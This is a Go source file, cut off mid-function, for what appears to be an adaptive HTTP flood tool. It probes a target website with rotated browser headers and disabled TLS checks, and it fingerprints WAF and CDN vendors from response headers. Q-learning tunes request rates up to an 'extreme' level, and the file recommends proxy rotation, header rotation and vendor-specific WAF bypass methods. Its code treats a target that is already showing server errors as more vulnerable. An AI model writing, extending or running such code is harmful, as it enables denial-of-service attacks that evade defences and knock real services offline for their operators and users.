package intelligence

import (
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/fatih/color"
)

// AttackIntelligence - Real-world ML-based attack optimization
type AttackIntelligence struct {
	targetProfile   *TargetProfile
	mutex           sync.RWMutex
	history         []AttackResult
	maxHistorySize  int
	recommendations *Recommendations
	httpClient      *http.Client

	// Real ML components
	qTable          map[string]map[string]float64 // Q-Learning table
	learningRate    float64
	discountFactor  float64
	explorationRate float64

	// Statistical models
	responseStats *RollingStats
	successStats  *RollingStats

	// Pattern detection
	wafSignatures map[string][]string
	cdnSignatures map[string][]string
}

// TargetProfile - Real target characteristics learned from probing
type TargetProfile struct {
	Domain              string
	IP                  string
	AverageResponseTime time.Duration
	MinResponseTime     time.Duration
	MaxResponseTime     time.Duration
	SuccessRate         float64
	OptimalRPS          int
	OptimalThreads      int

	// Defense detection
	WAFPresent         bool
	WAFType            string
	CDNPresent         bool
	CDNProvider        string
	RateLimitDetected  bool
	RateLimitThreshold int
	RateLimitWindow    time.Duration

	// Server characteristics
	ServerHeader        string
	PoweredBy           string
	ContentType         string
	SupportsHTTP2       bool
	SupportsCompression bool
	SecurityHeaders     []string

	// Behavioral patterns
	StatusCodeDist    map[int]int
	TimeBasedPatterns map[int]float64
	LoadPatterns      []LoadPattern

	// Scoring
	VulnerabilityScore float64
	Confidence         float64
	LastUpdated        time.Time
	SamplesCollected   int
}

// LoadPattern - Server load behavior at specific RPS
type LoadPattern struct {
	RPS          float64
	SuccessRate  float64
	ResponseTime time.Duration
	Timestamp    time.Time
}

// AttackResult - Result from attack attempt
type AttackResult struct {
	Timestamp    time.Time
	RequestsSent int
	Successful   int
	Failed       int
	Blocked      int
	Timeout      int
	ResponseTime time.Duration
	RPS          float64
	Vector       string
	StatusCodes  map[int]int
	Headers      map[string]string
	ErrorTypes   map[string]int
}

// Recommendations - ML-generated attack recommendations
type Recommendations struct {
	RPS            int
	Threads        int
	AttackVector   string
	DelayBetween   time.Duration
	BurstSize      int
	UseProxy       bool
	ProxyRotation  time.Duration
	HeaderRotation bool

	// Evasion
	EvasionTechniques []string
	WAFBypassMethods  []string

	// Predictions
	PredictedSuccess float64
	Confidence       float64
	Reasoning        string
}

// RollingStats - Rolling statistics calculator
type RollingStats struct {
	values    []float64
	maxSize   int
	sum       float64
	sumSquare float64
	mutex     sync.RWMutex
}

func NewRollingStats(maxSize int) *RollingStats {
	return &RollingStats{
		values:  make([]float64, 0, maxSize),
		maxSize: maxSize,
	}
}

func (rs *RollingStats) Add(value float64) {
	rs.mutex.Lock()
	defer rs.mutex.Unlock()

	if len(rs.values) >= rs.maxSize {
		// Remove oldest
		old := rs.values[0]
		rs.sum -= old
		rs.sumSquare -= old * old
		rs.values = rs.values[1:]
	}

	rs.values = append(rs.values, value)
	rs.sum += value
	rs.sumSquare += value * value
}

func (rs *RollingStats) Mean() float64 {
	rs.mutex.RLock()
	defer rs.mutex.RUnlock()

	if len(rs.values) == 0 {
		return 0
	}
	return rs.sum / float64(len(rs.values))
}

func (rs *RollingStats) StdDev() float64 {
	rs.mutex.RLock()
	defer rs.mutex.RUnlock()

	n := float64(len(rs.values))
	if n < 2 {
		return 0
	}

	mean := rs.sum / n
	variance := (rs.sumSquare / n) - (mean * mean)
	if variance < 0 {
		variance = 0
	}
	return math.Sqrt(variance)
}

func (rs *RollingStats) Percentile(p float64) float64 {
	rs.mutex.RLock()
	defer rs.mutex.RUnlock()

	if len(rs.values) == 0 {
		return 0
	}

	sorted := make([]float64, len(rs.values))
	copy(sorted, rs.values)
	sort.Float64s(sorted)

	idx := int(float64(len(sorted)-1) * p)
	return sorted[idx]
}

func (rs *RollingStats) Count() int {
	rs.mutex.RLock()
	defer rs.mutex.RUnlock()
	return len(rs.values)
}

// NewAttackIntelligence creates a new ML intelligence system
func NewAttackIntelligence(domain string) *AttackIntelligence {
	ai := &AttackIntelligence{
		targetProfile: &TargetProfile{
			Domain:            domain,
			LastUpdated:       time.Now(),
			StatusCodeDist:    make(map[int]int),
			TimeBasedPatterns: make(map[int]float64),
			LoadPatterns:      make([]LoadPattern, 0),
			SecurityHeaders:   make([]string, 0),
		},
		history:        make([]AttackResult, 0),
		maxHistorySize: 5000,
		recommendations: &Recommendations{
			RPS:          50,
			Threads:      10,
			AttackVector: "GET",
			DelayBetween: 100 * time.Millisecond,
			BurstSize:    10,
			Confidence:   0.0,
		},
		httpClient: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 20,
				IdleConnTimeout:     90 * time.Second,
				DisableKeepAlives:   false,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},

		// Q-Learning initialization
		qTable:          make(map[string]map[string]float64),
		learningRate:    0.1,
		discountFactor:  0.95,
		explorationRate: 0.15,

		// Statistics
		responseStats: NewRollingStats(1000),
		successStats:  NewRollingStats(1000),

		// WAF signatures
		wafSignatures: map[string][]string{
			"cloudflare":  {"cf-ray", "cloudflare", "__cfduid", "cf-cache-status"},
			"akamai":      {"akamai", "x-akamai", "ak_bmsc"},
			"aws-waf":     {"x-amzn-requestid", "x-amz-cf-id", "x-amz-id"},
			"imperva":     {"incap_ses", "visid_incap", "x-iinfo"},
			"sucuri":      {"sucuri", "x-sucuri-id"},
			"wordfence":   {"wordfence"},
			"modsecurity": {"mod_security", "modsec"},
			"f5-bigip":    {"x-wa-info", "bigipserver"},
			"barracuda":   {"barra_counter_session"},
		},
		cdnSignatures: map[string][]string{
			"cloudflare": {"cf-ray", "cloudflare"},
			"fastly":     {"x-served-by", "fastly"},
			"akamai":     {"x-akamai"},
			"cloudfront": {"x-amz-cf-id", "x-amz-cf-pop"},
			"incapsula":  {"x-cdn", "incap"},
			"stackpath":  {"x-sp-"},
			"bunny":      {"bunnycdn"},
		},
	}

	color.Green("✅ ML Intelligence System Initialized")
	color.Cyan("   • Q-Learning: Enabled (α=%.2f, γ=%.2f, ε=%.2f)", ai.learningRate, ai.discountFactor, ai.explorationRate)
	color.Cyan("   • Rolling Statistics: 1000 sample window")
	color.Cyan("   • WAF Detection: %d signatures loaded", len(ai.wafSignatures))
	color.Cyan("   • CDN Detection: %d signatures loaded", len(ai.cdnSignatures))

	return ai
}

// ProbeTarget - Real reconnaissance of target with actual HTTP requests
func (ai *AttackIntelligence) ProbeTarget(targetURL string, samples int) error {
	color.Yellow("\n🔍 Probing target: %s", targetURL)
	color.White("   Collecting %d samples...\n", samples)

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return fmt.Errorf("invalid URL: %v", err)
	}

	ai.targetProfile.Domain = parsedURL.Host

	var successCount, failCount int64
	var totalResponseTime int64
	var minRT, maxRT int64 = math.MaxInt64, 0

	statusCodes := sync.Map{}
	headers := sync.Map{}
	errorTypes := sync.Map{}

	// Concurrent probing with controlled rate
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)
	progressChan := make(chan int, samples)

	// Progress reporter
	go func() {
		completed := 0
		for range progressChan {
			completed++
			if completed%5 == 0 || completed == samples {
				pct := float64(completed) / float64(samples) * 100
				fmt.Printf("\r   📊 Progress: %d/%d (%.1f%%) | Success: %d | Failed: %d",
					completed, samples, pct,
					atomic.LoadInt64(&successCount),
					atomic.LoadInt64(&failCount))
			}
		}
	}()

	for i := 0; i < samples; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			start := time.Now()
			req, err := http.NewRequest("GET", targetURL, nil)
			if err != nil {
				atomic.AddInt64(&failCount, 1)
				progressChan <- 1
				return
			}

			// Realistic browser headers
			req.Header.Set("User-Agent", getRandomUserAgent())
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")

			resp, err := ai.httpClient.Do(req)
			elapsed := time.Since(start).Nanoseconds()

			if err != nil {
				atomic.AddInt64(&failCount, 1)
				// Categorize error
				errType := categorizeError(err)
				if val, ok := errorTypes.Load(errType); ok {
					errorTypes.Store(errType, val.(int)+1)
				} else {
					errorTypes.Store(errType, 1)
				}
				progressChan <- 1
				return
			}
			defer resp.Body.Close()
			io.Copy(io.Discard, resp.Body)

			atomic.AddInt64(&successCount, 1)
			atomic.AddInt64(&totalResponseTime, elapsed)

			// Track min/max response time atomically
			for {
				old := atomic.LoadInt64(&minRT)
				if elapsed >= old || atomic.CompareAndSwapInt64(&minRT, old, elapsed) {
					break
				}
			}
			for {
				old := atomic.LoadInt64(&maxRT)
				if elapsed <= old || atomic.CompareAndSwapInt64(&maxRT, old, elapsed) {
					break
				}
			}

			// Track status codes
			if val, ok := statusCodes.Load(resp.StatusCode); ok {
				statusCodes.Store(resp.StatusCode, val.(int)+1)
			} else {
				statusCodes.Store(resp.StatusCode, 1)
			}

			// Capture all response headers (from first few requests)
			if idx < 3 {
				for key, values := range resp.Header {
					headers.Store(strings.ToLower(key), values[0])
				}
			}

			progressChan <- 1
			time.Sleep(time.Duration(50+randInt(50)) * time.Millisecond)
		}(i)
	}

	wg.Wait()
	close(progressChan)
	fmt.Println() // New line after progress

	// Process results
	ai.mutex.Lock()
	defer ai.mutex.Unlock()

	profile := ai.targetProfile
	total := successCount + failCount

	if successCount > 0 {
		profile.AverageResponseTime = time.Duration(totalResponseTime / successCount)
		if minRT != math.MaxInt64 {
			profile.MinResponseTime = time.Duration(minRT)
		}
		profile.MaxResponseTime = time.Duration(maxRT)
	}

	if total > 0 {
		profile.SuccessRate = float64(successCount) / float64(total)
	}

	// Copy status codes
	statusCodes.Range(func(key, value interface{}) bool {
		profile.StatusCodeDist[key.(int)] = value.(int)
		return true
	})

	// Detect WAF/CDN from response headers
	headers.Range(func(key, value interface{}) bool {
		headerKey := key.(string)
		headerValue := value.(string)

		// WAF detection
		for wafType, signatures := range ai.wafSignatures {
			for _, sig := range signatures {
				if strings.Contains(strings.ToLower(headerKey), sig) ||
					strings.Contains(strings.ToLower(headerValue), sig) {
					profile.WAFPresent = true
					profile.WAFType = wafType
				}
			}
		}

		// CDN detection
		for cdnType, signatures := range ai.cdnSignatures {
			for _, sig := range signatures {
				if strings.Contains(strings.ToLower(headerKey), sig) ||
					strings.Contains(strings.ToLower(headerValue), sig) {
					profile.CDNPresent = true
					profile.CDNProvider = cdnType
				}
			}
		}

		// Server fingerprinting
		switch headerKey {
		case "server":
			profile.ServerHeader = headerValue
		case "x-powered-by":
			profile.PoweredBy = headerValue
		case "content-type":
			profile.ContentType = headerValue
		}

		// Security headers
		secHeaders := []string{"x-frame-options", "x-content-type-options", "x-xss-protection",
			"content-security-policy", "strict-transport-security", "x-permitted-cross-domain-policies"}
		for _, sh := range secHeaders {
			if headerKey == sh {
				profile.SecurityHeaders = append(profile.SecurityHeaders, headerKey)
			}
		}

		return true
	})

	// Detect rate limiting from response codes
	if count, ok := profile.StatusCodeDist[429]; ok && count > 0 {
		profile.RateLimitDetected = true
		profile.RateLimitThreshold = samples / (count + 1)
	}
	if count, ok := profile.StatusCodeDist[503]; ok && count > int(total)/4 {
		profile.RateLimitDetected = true
	}
	if count, ok := profile.StatusCodeDist[403]; ok && count > int(total)/3 {
		profile.WAFPresent = true
	}

	// Calculate scores
	profile.VulnerabilityScore = ai.calculateVulnerabilityScore()
	profile.Confidence = math.Min(1.0, float64(samples)/100.0)
	profile.SamplesCollected = samples
	profile.LastUpdated = time.Now()

	// Print detailed results
	ai.printProbeResults()

	return nil
}

func categorizeError(err error) string {
	errStr := strings.ToLower(err.Error())
	switch {
	case strings.Contains(errStr, "timeout"):
		return "timeout"
	case strings.Contains(errStr, "connection refused"):
		return "connection_refused"
	case strings.Contains(errStr, "no such host"):
		return "dns_error"
	case strings.Contains(errStr, "reset"):
		return "connection_reset"
	case strings.Contains(errStr, "tls"):
		return "tls_error"
	case strings.Contains(errStr, "eof"):
		return "connection_closed"
	default:
		return "unknown"
	}
}

func (ai *AttackIntelligence) calculateVulnerabilityScore() float64 {
	score := 100.0
	profile := ai.targetProfile

	// WAF significantly reduces vulnerability
	if profile.WAFPresent {
		score -= 30
	}

	// CDN provides protection
	if profile.CDNPresent {
		score -= 20
	}

	// Rate limiting
	if profile.RateLimitDetected {
		score -= 15
	}

	// Security headers
	score -= float64(len(profile.SecurityHeaders)) * 4

	// Slow response = potentially overloaded/vulnerable
	if profile.AverageResponseTime > 2*time.Second {
		score += 15
	} else if profile.AverageResponseTime > 1*time.Second {
		score += 8
	}

	// High success rate = accessible
	if profile.SuccessRate > 0.95 {
		score += 10
	}

	// Many 5xx errors = already stressed
	if count, ok := profile.StatusCodeDist[500]; ok && count > 0 {
		score += 10
	}
	if count, ok := profile.StatusCodeDist[502]; ok && count > 0 {
		score += 10
	}
	if count, ok := profile.StatusCodeDist[504]; ok && count > 0 {
		score += 10
	}

	return math.Max(0, math.Min(100, score))
}

func (ai *AttackIntelligence) printProbeResults() {
	profile := ai.targetProfile

	color.Cyan("\n┌─────────────────────────────────────────────────────────────────┐")
	color.Cyan("│                      🎯 PROBE RESULTS                           │")
	color.Cyan("├─────────────────────────────────────────────────────────────────┤")
	fmt.Printf("│ %-20s %-43s │\n", "Target:", profile.Domain)
	fmt.Printf("│ %-20s %-43.1f%% │\n", "Success Rate:", profile.SuccessRate*100)
	fmt.Printf("│ %-20s %-43s │\n", "Avg Response:", profile.AverageResponseTime.Round(time.Millisecond))
	fmt.Printf("│ %-20s %-43s │\n", "Min Response:",
		profile.MinResponseTime.Round(time.Millisecond))
	fmt.Printf("│ %-20s %-43s │\n", "Max Response:",
		profile.MaxResponseTime.Round(time.Millisecond))

	color.Cyan("├─────────────────────────────────────────────────────────────────┤")
	color.Cyan("│                      🛡️  DEFENSES                                │")
	color.Cyan("├─────────────────────────────────────────────────────────────────┤")

	if profile.WAFPresent {
		color.Red("│ %-20s %-43s │\n", "WAF:", strings.ToUpper(profile.WAFType))
	} else {
		color.Green("│ %-20s %-43s │\n", "WAF:", "Not Detected ✓")
	}

	if profile.CDNPresent {
		color.Yellow("│ %-20s %-43s │\n", "CDN:", strings.ToUpper(profile.CDNProvider))
	} else {
		color.Green("│ %-20s %-43s │\n", "CDN:", "Not Detected ✓")
	}

	if profile.RateLimitDetected {
		color.Red("│ %-20s ~%-42d │\n", "Rate Limit:", profile.RateLimitThreshold)
	} else {
		color.Green("│ %-20s %-43s │\n", "Rate Limit:", "Not Detected ✓")
	}

	fmt.Printf("│ %-20s %-43d │\n", "Security Headers:", len(profile.SecurityHeaders))

	if profile.ServerHeader != "" {
		fmt.Printf("│ %-20s %-43s │\n", "Server:", truncateStr(profile.ServerHeader, 43))
	}

	if profile.PoweredBy != "" {
		fmt.Printf("│ %-20s %-43s │\n", "Powered By:", truncateStr(profile.PoweredBy, 43))
	}

	color.Cyan("├─────────────────────────────────────────────────────────────────┤")
	color.Cyan("│                      📊 STATUS CODES                            │")
	color.Cyan("├─────────────────────────────────────────────────────────────────┤")

	// Sort status codes
	codes := make([]int, 0, len(profile.StatusCodeDist))
	for code := range profile.StatusCodeDist {
		codes = append(codes, code)
	}
	sort.Ints(codes)

	for _, code := range codes {
		count := profile.StatusCodeDist[code]
		pct := float64(count) / float64(profile.SamplesCollected) * 100
		bar := strings.Repeat("█", int(pct/5))
		if code >= 500 {
			color.Red("│   %d: %4d (%.1f%%) %s\n", code, count, pct, bar)
		} else if code >= 400 {
			color.Yellow("│   %d: %4d (%.1f%%) %s\n", code, count, pct, bar)
		} else if code >= 300 {
			color.Cyan("│   %d: %4d (%.1f%%) %s\n", code, count, pct, bar)
		} else {
			color.Green("│   %d: %4d (%.1f%%) %s\n", code, count, pct, bar)
		}
	}

	color.Cyan("├─────────────────────────────────────────────────────────────────┤")

	// Vulnerability score with color coding
	vulnScore := profile.VulnerabilityScore
	if vulnScore >= 70 {
		color.Red("│ %-20s %-43.1f │\n", "Vulnerability Score:", vulnScore)
	} else if vulnScore >= 40 {
		color.Yellow("│ %-20s %-43.1f │\n", "Vulnerability Score:", vulnScore)
	} else {
		color.Green("│ %-20s %-43.1f │\n", "Vulnerability Score:", vulnScore)
	}

	fmt.Printf("│ %-20s %-43.1f%% │\n", "Confidence:", profile.Confidence*100)
	color.Cyan("└─────────────────────────────────────────────────────────────────┘")
}

func truncateStr(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

// LearnFromResult - Real-time ML learning from attack results
func (ai *AttackIntelligence) LearnFromResult(result AttackResult) {
	ai.mutex.Lock()
	defer ai.mutex.Unlock()

	// Add to history buffer
	ai.history = append(ai.history, result)
	if len(ai.history) > ai.maxHistorySize {
		ai.history = ai.history[len(ai.history)-ai.maxHistorySize:]
	}

	// Update rolling statistics
	total := result.Successful + result.Failed + result.Blocked
	if total > 0 {
		successRate := float64(result.Successful) / float64(total)
		ai.successStats.Add(successRate)
	}
	ai.responseStats.Add(float64(result.ResponseTime.Milliseconds()))

	// Update target profile with new data
	ai.updateProfile(result)

	// Q-Learning update
	ai.updateQLearning(result)

	// Track load patterns
	totalReqs := result.Successful + result.Failed + result.Blocked
	if totalReqs > 0 {
		ai.targetProfile.LoadPatterns = append(ai.targetProfile.LoadPatterns, LoadPattern{
			RPS:          result.RPS,
			SuccessRate:  float64(result.Successful) / float64(totalReqs),
			ResponseTime: result.ResponseTime,
			Timestamp:    result.Timestamp,
		})

		// Limit pattern history
		if len(ai.targetProfile.LoadPatterns) > 500 {
			ai.targetProfile.LoadPatterns = ai.targetProfile.LoadPatterns[len(ai.targetProfile.LoadPatterns)-500:]
		}
	}

	// Regenerate recommendations
	ai.generateRecommendations()

	ai.targetProfile.SamplesCollected++
	ai.targetProfile.LastUpdated = time.Now()
}

func (ai *AttackIntelligence) updateProfile(result AttackResult) {
	profile := ai.targetProfile
	total := result.Successful + result.Failed + result.Blocked

	if total > 0 {
		// Exponential moving average for success rate
		newRate := float64(result.Successful) / float64(total)
		if profile.SuccessRate == 0 {
			profile.SuccessRate = newRate
		} else {
			profile.SuccessRate = 0.85*profile.SuccessRate + 0.15*newRate
		}
	}

	// Update response time EMA
	if result.ResponseTime > 0 {
		if profile.AverageResponseTime == 0 {
			profile.AverageResponseTime = result.ResponseTime
		} else {
			profile.AverageResponseTime = time.Duration(
				0.85*float64(profile.AverageResponseTime) + 0.15*float64(result.ResponseTime))
		}
	}

	// Update status code distribution
	for code, count := range result.StatusCodes {
		profile.StatusCodeDist[code] += count
	}

	// Detect rate limiting dynamically
	if result.Blocked > result.Successful {
		profile.RateLimitDetected = true
		threshold := int(result.RPS)
		if profile.RateLimitThreshold == 0 || threshold < profile.RateLimitThreshold {
			profile.RateLimitThreshold = threshold
		}
	}

	// Time-based behavioral patterns
	hour := result.Timestamp.Hour()
	if existing, ok := profile.TimeBasedPatterns[hour]; ok {
		profile.TimeBasedPatterns[hour] = 0.8*existing + 0.2*profile.SuccessRate
	} else {
		profile.TimeBasedPatterns[hour] = profile.SuccessRate
	}

	// Recalculate vulnerability
	profile.VulnerabilityScore = ai.calculateVulnerabilityScore()
	profile.Confidence = math.Min(1.0, float64(ai.successStats.Count())/500.0)
}

func (ai *AttackIntelligence) updateQLearning(result AttackResult) {
	// Get current state representation
	state := ai.getState()

	// Get action taken
	action := ai.getAction(result)

	// Calculate reward based on attack effectiveness
	total := result.Successful + result.Failed + result.Blocked
	reward := 0.0
	if total > 0 {
		successRate := float64(result.Successful) / float64(total)
		blockRate := float64(result.Blocked) / float64(total)

		// Reward function: maximize success, penalize blocks
		reward = successRate - 0.7*blockRate

		// Bonus for high RPS with good success
		if result.RPS > 100 && successRate > 0.8 {
			reward += 0.2
		}

		// Penalty for timeouts
		if result.ResponseTime > 10*time.Second {
			reward -= 0.3
		} else if result.ResponseTime > 5*time.Second {
			reward -= 0.1
		}
	}

	// Initialize state in Q-table if needed
	if ai.qTable[state] == nil {
		ai.qTable[state] = make(map[string]float64)
	}

	// Q-Learning update: Q(s,a) = Q(s,a) + α * (r + γ * max(Q(s',a')) - Q(s,a))
	currentQ := ai.qTable[state][action]
	maxNextQ := ai.getMaxQ(state)
	newQ := currentQ + ai.learningRate*(reward+ai.discountFactor*maxNextQ-currentQ)
	ai.qTable[state][action] = newQ
}

func (ai *AttackIntelligence) getState() string {
	successMean := ai.successStats.Mean()
	responseMean := ai.responseStats.Mean()

	// Discretize continuous state into buckets
	var successLevel string
	switch {
	case successMean >= 0.9:
		successLevel = "excellent"
	case successMean >= 0.7:
		successLevel = "good"
	case successMean >= 0.5:
		successLevel = "moderate"
	case successMean >= 0.3:
		successLevel = "poor"
	default:
		successLevel = "failing"
	}

	var responseLevel string
	switch {
	case responseMean < 300:
		responseLevel = "fast"
	case responseMean < 1000:
		responseLevel = "normal"
	case responseMean < 3000:
		responseLevel = "slow"
	case responseMean < 10000:
		responseLevel = "very_slow"
	default:
		responseLevel = "timeout"
	}

	defense := "unprotected"
	if ai.targetProfile.WAFPresent && ai.targetProfile.CDNPresent {
		defense = "fully_protected"
	} else if ai.targetProfile.WAFPresent {
		defense = "waf"
	} else if ai.targetProfile.CDNPresent {
		defense = "cdn"
	} else if ai.targetProfile.RateLimitDetected {
		defense = "rate_limited"
	}

	return fmt.Sprintf("%s_%s_%s", successLevel, responseLevel, defense)
}

func (ai *AttackIntelligence) getAction(result AttackResult) string {
	rps := int(result.RPS)
	switch {
	case rps < 30:
		return "stealth"
	case rps < 100:
		return "low"
	case rps < 300:
		return "medium"
	case rps < 700:
		return "high"
	case rps < 1500:
		return "aggressive"
	default:
		return "extreme"
	}
}

func (ai *AttackIntelligence) getMaxQ(state string) float64 {
	if ai.qTable[state] == nil {
		return 0
	}

	maxQ := -math.MaxFloat64
	for _, q := range ai.qTable[state] {
		if q > maxQ {
			maxQ = q
		}
	}

	if maxQ == -math.MaxFloat64 {
		return 0
	}
	return maxQ
}

func (ai *AttackIntelligence) generateRecommendations() {
	rec := ai.recommendations
	profile := ai.targetProfile

	// Get best action from Q-table
	state := ai.getState()
	bestAction := ai.getBestAction(state)

	// Map action to RPS range
	switch bestAction {
	case "stealth":
		rec.RPS = 15 + randInt(15)
	case "low":
		rec.RPS = 50 + randInt(50)
	case "medium":
		rec.RPS = 150 + randInt(100)
	case "high":
		rec.RPS = 400 + randInt(200)
	case "aggressive":
		rec.RPS = 800 + randInt(400)
	case "extreme":
		rec.RPS = 1500 + randInt(1000)
	default:
		rec.RPS = 100
	}

	// Adjust for WAF
	if profile.WAFPresent {
		rec.RPS = int(float64(rec.RPS) * 0.4) // Significant reduction
		rec.DelayBetween = 300 * time.Millisecond
		rec.UseProxy = true
		rec.HeaderRotation = true
		rec.EvasionTechniques = []string{
			"user-agent-rotation",
			"header-case-randomization",
			"request-jitter",
			"cookie-manipulation",
			"path-fuzzing",
		}
		rec.WAFBypassMethods = ai.getWAFBypassMethods(profile.WAFType)
	} else {
		rec.DelayBetween = 50 * time.Millisecond
		rec.EvasionTechniques = []string{}
		rec.WAFBypassMethods = []string{}
	}

	// Adjust for rate limiting
	if profile.RateLimitDetected && profile.RateLimitThreshold > 0 {
		safeRPS := int(float64(profile.RateLimitThreshold) * 0.6)
		if rec.RPS > safeRPS {
			rec.RPS = safeRPS
		}
		rec.UseProxy = true
		rec.ProxyRotation = 30 * time.Second
	}

	// Adjust for CDN
	if profile.CDNPresent {
		rec.RPS = int(float64(rec.RPS) * 0.7)
	}

	// Calculate threads
	rec.Threads = maxInt(5, rec.RPS/8)
	if rec.Threads > 150 {
		rec.Threads = 150
	}

	// Burst configuration
	rec.BurstSize = maxInt(3, rec.RPS/4)
	if rec.BurstSize > 50 {
		rec.BurstSize = 50
	}

	// Predict success probability
	rec.PredictedSuccess = ai.predictSuccessRate(rec)
	rec.Confidence = profile.Confidence

	// Generate reasoning
	rec.Reasoning = ai.generateReasoning()
}

func (ai *AttackIntelligence) getBestAction(state string) string {
	actions := []string{"stealth", "low", "medium", "high", "aggressive", "extreme"}

	// Epsilon-greedy exploration
	if randFloat() < ai.explorationRate {
		return actions[randInt(len(actions))]
	}

	// Exploitation: choose best known action
	if ai.qTable[state] == nil {
		return "medium"
	}

	bestAction := "medium"
	bestQ := -math.MaxFloat64

	for action, q := range ai.qTable[state] {
		if q > bestQ {
			bestQ = q
			bestAction = action
		}
	}

	return bestAction
}

func (ai *AttackIntelligence) predictSuccessRate(rec *Recommendations) float64 {
	patterns := ai.targetProfile.LoadPatterns
	if len(patterns) == 0 {
		return 0.5
	}

	// Weighted average based on similar RPS levels
	var totalWeight, weightedSuccess float64
	targetRPS := float64(rec.RPS)

	for _, lp := range patterns {
		// Gaussian kernel weighting
		distance := math.Abs(lp.RPS - targetRPS)
		weight := math.Exp(-distance * distance / (2 * 100 * 100))

		// Recency bonus
		age := time.Since(lp.Timestamp).Hours()
		recencyWeight := math.Exp(-age / 24)

		combinedWeight := weight * recencyWeight
		totalWeight += combinedWeight
		weightedSuccess += combinedWeight * lp.SuccessRate
	}

	if totalWeight > 0 {
		return weightedSuccess / totalWeight
	}

	return ai.successStats.Mean()
}

func (ai *AttackIntelligence) generateReasoning() string {
	profile := ai.targetProfile
	rec := ai.recommendations
	reasons := []string{}

	if profile.WAFPresent {
		reasons = append(reasons, fmt.Sprintf("%s WAF → evasion mode", strings.ToUpper(profile.WAFType)))
	}

	if profile.RateLimitDetected {
		reasons = append(reasons, fmt.Sprintf("rate limit ~%d RPS → throttled", profile.RateLimitThreshold))
	}

	if profile.CDNPresent {
		reasons = append(reasons, fmt.Sprintf("%s CDN → distributed approach", strings.ToUpper(profile.CDNProvider)))
	}

	successMean := ai.successStats.Mean()
	if successMean > 0.85 {
		reasons = append(reasons, "high success → can intensify")
	} else if successMean < 0.3 {
		reasons = append(reasons, "low success → defensive mode")
	}

	if len(reasons) == 0 {
		return fmt.Sprintf("Q-Learning: RPS=%d, threads=%d (%.0f%% confidence)",
			rec.RPS, rec.Threads, rec.Confidence*100)
	}

	return strings.Join(reasons, " | ")
}

func (ai *AttackIntelligence) getWAFBypassMethods(wafType string) []string {
	methods := map[string][]string{
		"cloudflare": {
			"IP rotation via proxies",
			"Request header case variation",
			"Chunked transfer encoding",
			"Unicode/URL encoding bypass",
			"Origin header manipulation",
		},
		"akamai": {
			"Slow and steady request rate",
			"Session token rotation",
			"Bot score reduction headers",
			"Geographic distribution",
		},
		"aws-waf": {
			"Request body size manipulation",
			"Unicode normalization bypass",
			"HTTP method fuzzing",
			"Query string fragmentation",
		},
		"imperva": {
			"JavaScript challenge handling",
			"Cookie session rotation",
			"Request signature variation",
			"HTTP/2 multiplexing",
		},
		"f5-bigip": {
			"ASM signature evasion",
			"Protocol-level manipulation",
			"Session persistence bypass",
		},
		"modsecurity": {
			"Rule bypass encoding",
			"Parameter pollution",
			"Multipart boundary fuzzing",
		},
	}

	if m, ok := methods[wafType]; ok {
		return m
	}

	return []string{"Generic WAF evasion", "Request throttling", "Header rotation"}
}

// GetRecommendations returns current ML-generated recommendations
func (ai *AttackIntelligence) GetRecommendations() *Recommendations {
	ai.mutex.RLock()
	defer ai.mutex.RUnlock()
	rec := *ai.recommendations
	return &rec
}

// GetProfile returns the current target profile
func (ai *AttackIntelligence) GetProfile() *TargetProfile {
	ai.mutex.RLock()
	defer ai.mutex.RUnlock()
	profile := *ai.targetProfile
	return &profile
}

// GetStats returns detailed intelligence statistics
func (ai *AttackIntelligence) GetStats() map[string]interface{} {
	ai.mutex.RLock()
	defer ai.mutex.RUnlock()

	qStates := len(ai.qTable)
	qActions := 0
	for _, actions := range ai.qTable {
		qActions += len(actions)
	}

	return map[string]interface{}{
		// Sample data
		"total_samples":     len(ai.history),
		"samples_collected": ai.targetProfile.SamplesCollected,

		// Success metrics
		"current_success_rate": ai.successStats.Mean(),
		"success_stddev":       ai.successStats.StdDev(),
		"success_p95":          ai.successStats.Percentile(0.95),

		// Response metrics
		"avg_response_ms":    ai.responseStats.Mean(),
		"response_stddev_ms": ai.responseStats.StdDev(),
		"response_p95_ms":    ai.responseStats.Percentile(0.95),
		"response_p99_ms":    ai.responseStats.Percentile(0.99),

		// Defense status
		"waf_detected":         ai.targetProfile.WAFPresent,
		"waf_type":             ai.targetProfile.WAFType,
		"cdn_detected":         ai.targetProfile.CDNPresent,
		"cdn_provider":         ai.targetProfile.CDNProvider,
		"rate_limit_detected":  ai.targetProfile.RateLimitDetected,
		"rate_limit_threshold": ai.targetProfile.RateLimitThreshold,

		// Scoring
		"vulnerability_score": ai.targetProfile.VulnerabilityScore,
		"confidence":          ai.targetProfile.Confidence,

		// Q-Learning
		"q_table_states":  qStates,
		"q_table_actions": qActions,
		"learning_rate":   ai.learningRate,
		"discount_factor": ai.discountFactor,
		"exploration":     ai.explorationRate,

		// Load patterns
		"load_patterns_count": len(ai.targetProfile.LoadPatterns),

		// Security posture
		"security_headers": ai.targetProfile.SecurityHeaders,
	}
}

// FindOptimalRPS analyzes historical data to find optimal attack intensity
func (ai *AttackIntelligence) FindOptimalRPS() int {
	ai.mutex.RLock()
	defer ai.mutex.RUnlock()

	patterns := ai.targetProfile.LoadPatterns
	if len(patterns) == 0 {
		return 100
	}

	// Find highest RPS with acceptable success rate (>65%)
	var optimalRPS float64
	for _, lp := range patterns {
